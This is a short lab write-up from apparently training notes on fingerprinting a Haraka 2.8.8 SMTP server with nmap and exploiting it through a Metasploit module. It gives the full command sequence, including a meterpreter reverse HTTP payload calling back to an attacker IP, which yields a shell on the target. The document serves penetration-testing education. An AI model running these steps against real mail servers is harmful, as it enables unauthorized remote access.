# Vulnerable SMTP Server

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4745–4780. Examples are lab-specific and need verification.

In this lab, you will see how to fingerpint and exploit a vulnerable SMTP server using an appropriate Metasploit module to gain a shell on the target.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Your task is to fingerprint the application using command line tools available in Kali and then exploit the application using the appropriate Metasploit module. Get a shell on the target!

**Tools: nmap , msf**

```bash
 nmap -Pn -A - T4 demo.ine.local
#25/tcp open  smtp    Haraka smtpd 2.8.8

msfconsole
search haraka
use 0
or
use exploit/linux/smtp/haraka
show options

use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost demo.ine.local
set LHOST 192.164.31.2
exploit

#got meterpreter sessions
sessions
sessions 1
meterpreter>getuid, sysinfo

```
